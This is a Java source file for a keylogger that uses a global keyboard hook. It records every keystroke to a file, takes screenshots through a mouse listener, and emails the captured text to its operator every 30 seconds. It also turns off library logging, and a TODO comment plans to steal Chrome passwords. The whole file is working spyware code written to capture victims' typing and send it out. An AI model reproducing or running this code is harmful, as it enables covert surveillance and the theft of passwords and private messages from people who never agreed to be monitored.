package com.radwanfaci;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.mail.MessagingException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseListener;
/**
 * @author javaQuery
 * Global Keyboard Listener
 */
public class NativeEventListeners implements NativeKeyListener {

    /* Key Pressed */
	static String message = "";
	public static String desktopPath = System.getProperty("user.home") + File.separatorChar +"Desktop" + File.separatorChar + "keylogger_files";
	static File log = new File(desktopPath + File.separatorChar + "keylog.txt");
	static FileWriter fw; //TODO: Replace with filewriter
	static BufferedWriter writer;
	static NativeKeyListener NKL;
	static NativeMouseListener NML;
	static final long time_interval = 10 * 60 * 1000; // 10 minutes = 10 (m) * 60 (s) * 1000 (to ms)
    public void nativeKeyPressed(NativeKeyEvent e) {
    	String key = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
    	switch(key)
    	{
    	case "space":
    		key = " ";
    		break;
    	case "escape":
    		key = "[esc]";
    		break;
    	case "left shift":
    		key = "[l_shift]";
    		break;
    	case "right shift":
    		key = "[r_shift]";
    		break;
    	case "left alt":
    		key = "[l_alt]";
    		break;
    	case "right alt":
    		key = "[r_alt]";
    		break;
    	case "left control":
    		key = "[l_ctrl]";
    		break;
    	case "right right":
    		key = "[r_ctrl]";
    		break;
    	case "backspace":
    		key = "[backspace]";
    		break;
    	case "period":
    		key =".";
    		break;
    	case "enter":
    		key ="\n";
    		break;
    	case "tab":
    		key ="[tab]";
    		break;
    	case "semicolon":
    		key = ":";
    		break;
    	case "left":
    		key = "[left]";
    		break;
    	case "right":
    		key = "[right]";
    		break;
    	case "up":
    		key = "[up]";
    		break;
    	case "down":
    		key = "[down]";
    		break;
    	case "caps lock":
    		key = "[caps]";
    		break;
    	case "left meta":
    		key = "[GUI]";
    	case "quote":
    		key = "[quote]";
    		break;
    	}
    	message+=key;
    	System.out.println(message);
        /* Terminate program when ESCAPE is pressed*/
    	/*
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
//    	if(System.currentTimeMillis() % time_interval == 0){
        	try {
				GlobalScreen.removeNativeKeyListener(NKL);
				GlobalScreen.removeNativeMouseListener(NML);
				writer.println("Here's what I've found");
				writer.print(message);
		    	writer.flush();
				writer.close();
//				System.exit(0); //TODO: Remove to get to email part
				MailSender.generateAndSendEmail("Hello!, here's what I found <br />" + message.replaceAll("\n", "<br />"));
//				System.out.println(message);
			} catch (MessagingException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
        */

    }

    
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
    	String key = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
    	switch(key)
    	{
    	case "left shift":
    		key = "[released_l_shift]";
    		break;
    	case "right shift":
    		key = "[released_r_shift]";
    		break;
    	case "caps lock":
    		key = "[released_caps]";
    		break;
    	default:
    		key = "";
    	}
    	message+=key;
    	System.out.println(message);
    	try {
			writer.write(key);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}
    

    public static void main(String[] args) throws InterruptedException, IOException {
    	//TODO: Steal chrome pw (http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html)
        PrintStream original = System.out;
        System.setOut(new PrintStream(new OutputStream() {
                    public void write(int b) {
                        //DO NOTHING
                    }
                }));
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        System.setOut(original);//move below to prevent GPL spam
        try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            /* Its error */
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        new File(desktopPath).mkdir();
        log.createNewFile();
        fw = new FileWriter(log);
        writer = new BufferedWriter(fw);
        /* Construct the example object and initialze native hook. */
        NKL = new NativeEventListeners();
        NML = new Screenshotter();
        GlobalScreen.addNativeKeyListener(NKL);
        GlobalScreen.addNativeMouseListener(NML);

        
        final ScheduledExecutorService exec = Executors.newScheduledThreadPool(1);
        Runnable rb = new Runnable(){
            @Override
            public void run(){
        		try {
					MailSender.generateAndSendEmail("Hello!, here's what I found <br />" + message.replaceAll("\n", "<br />"));
					try {
						writer.write(message);
						writer.newLine();
						writer.flush();
						System.out.println("Message saved to file!");
					} catch (IOException e) {
						e.printStackTrace();
					}
					message = "";
				} catch (MessagingException e) {
					e.printStackTrace();
				}
                exec.schedule(this, 30, TimeUnit.SECONDS);
        	}
        };
        
        exec.schedule(rb, 30, TimeUnit.SECONDS);
    }


	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
}